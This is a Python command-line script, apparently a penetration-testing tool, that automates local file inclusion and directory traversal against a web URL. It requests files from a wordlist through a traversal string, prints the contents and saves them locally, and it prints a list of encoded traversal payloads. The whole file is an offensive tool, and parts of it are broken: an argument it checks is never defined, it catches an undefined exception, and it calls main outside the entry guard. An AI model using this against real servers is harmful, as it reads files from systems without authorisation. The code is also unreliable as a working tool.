#!/usr/bin/env python3

# TODO: Null Byte
# Ideas listed on  https://highon.coffee/blog/lfi-cheat-sheet/
# LFI Payloads: https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI


import requests,sys,argparse,os,time
from urllib.parse import quote
from pathlib import Path

version="0.1"

def printBanner():
	print("lfi-enum {}".format(version))


def printTraversalHints():
	"Gives the user some ideas for directory traversal"
	print("You can try the following encoded directory traversal encoding schemes:\n")
	print("\t../")
	print("\t..\\")
	print("\t..\\/")
	print("\t%2e%2e%2f")
	print("\t%252e%252e%252f")
	print("\t%c0%ae%c0%ae%c0%af")
	print("\t%uff0e%uff0e%u2215")
	print("\t%uff0e%uff0e%u2216")
	print("\t..././")
	print("\t....\\")
	print("\t/???/")


def loadWordlist(wordlistfile):
	vprint("Loading wordlist...")
	wordlist=[]
	try:
		with open(wordlistfile,"r") as file:
			for line in file:
				wordlist.append(line)

	except Exception as e:
		print("Cannot open specified wordlist file: {}".format(wordlistfile))
		print(str(e))
		exit()
	
	vprint('Loaded %d paths to check.' % (len(wordlist)))
	vprint(wordlist)
	vprint('------------------------\n')

	return wordlist



def createDir(directory):
	
	#newdir=os.path.join(os.getcwd(),directory)    # creates perms of d--------x
	newdir=Path(os.getcwd(),directory)  
	vprint("Creating {}".format(newdir))

	try:
		os.makedirs(newdir,0o775,True)
	except FileExistsError:
		print("{} already exists.".format(newdir))
		pass
	except OSError as e:
		raise e
	finally:
		return newdir



def writeFile(filename,content,directory):
	print("Writing file {} in {}".format(filename,directory))


	# First crunch the path/filename from target to a flat file name
	tmpfile=filename

	# Handle Unix paths
	# If unix path starts with leading /, delete it
	if tmpfile.startswith('/'):
		tmpfile=tmpfile.replace('/','',1)

	# replace the others with an underscore
	tmpfile=tmpfile.replace('/','_')
	
	# handle Windows paths
	tmpfile=tmpfile.replace(':','')
	tmpfile=tmpfile.replace('\\','_')

	print(tmpfile)

	# Build the full file path
	d=Path(directory)
	f=d/tmpfile

	print(f)

	# Then open the file and write it.
	f=str(f).rstrip()

	if len(content)>0:
		try:
			fh = open(f,"w")
			fh.write(content)
			fh.close()
		except OSError as e:
			raise





def testLFI(path,wordlist,directory=None):
	"The meat of the program. iterate through word list and request each file. Write files out if requested"
	for line in wordlist:
		url=(path+line).rstrip()
		vprint("Requesting {}".format(url))
		
		try:
			r=requests.get(url)
		except Error as e:
			raise


		vprint("Request: {}, Status: {}, Length {}".format(url,str(r.status_code),str(r.headers["Content-Length"])),end='\n')

		if r.status_code:
			if int(r.headers["Content-Length"])==0:
				vprint("No content")
				print("------------------------")
			else:
				print(url)
				print(r.text)
				
				# If we were passed a directory, write the response body in there.
				if directory!=None:
					writeFile(line,r.text,directory)
		else:
			print(str(r.status_code)+ " Error requesting "+url)


def main(args):
	printBanner()

	# Give user hints and exit.	
	if(args.traversal):
		printTraversalHints()
		exit()

	# Build out the base URL from commandline arguments to test against
	
	if args.count==0:
		exit()

	base_url=args.url
	path_traversal_escape=args.path_traversal_string
	path=base_url+path_traversal_escape
	outdir=args.outdir

	# Load wordlist from file.
	wordlistfile=args.wordlist
	wordlist=loadWordlist(wordlistfile)

	# Create Output Directory if required
	if outdir!=None:
		print("Output directory: {}".format(outdir))
		fulldir=createDir(outdir)

#	exit()		# Exit for now
	testLFI(path,wordlist,fulldir)





if __name__== '__main__':
	parser = argparse.ArgumentParser( 
	                                description = "Automates directory traversal and LFI checks.",
	                                epilog = "As an alternative to the commandline, params can be placed in a file, one per line, and specified on the commandline like '%(prog)s @params.conf'.",
	                                fromfile_prefix_chars = '@' )
	parser.add_argument(
	                      "-u",
	                      "--url",
	                      help = "Base URL to directory traversal vulnerability.  e.g http://hostname/path?arg=",
	                      metavar = "URL")

	parser.add_argument(
						  "-p",
						  "--path_traversal_string",
						  help="The string required to reach the root directory. e.g. ../../../..")
	parser.add_argument(
	                      "-w",
	                      "--wordlist",
	                      help="Specify an LFI wordlist. Wordlists are expected to be absolute paths on target system")
	parser.add_argument(
	                      "-v",
	                      "--verbose",
	                      help="increase output verbosity",
	                      action="store_true")
	parser.add_argument(
						  "-o",
						  "--outdir",
						  help="Specify a directory relative to the current directory to save files. Filenames will be flattened in here")
	parser.add_argument(
						  "-t",
						  "--traversal",
						  help="Prints some example directory traversal strings to try.",
						  action="store_true")
	parser.add_argument(
						  "-r",
						  "--remote",
						  help="TODO: Not Implimented. Starts a simple webserver and attempts a remote file inclusion ")


	if len(sys.argv)==1:
		parser.print_help()
		sys.exit()

	args = parser.parse_args()

	# Define a verbose printing mechanism
	vprint = print if args.verbose else lambda *a, **k: None

main(args)



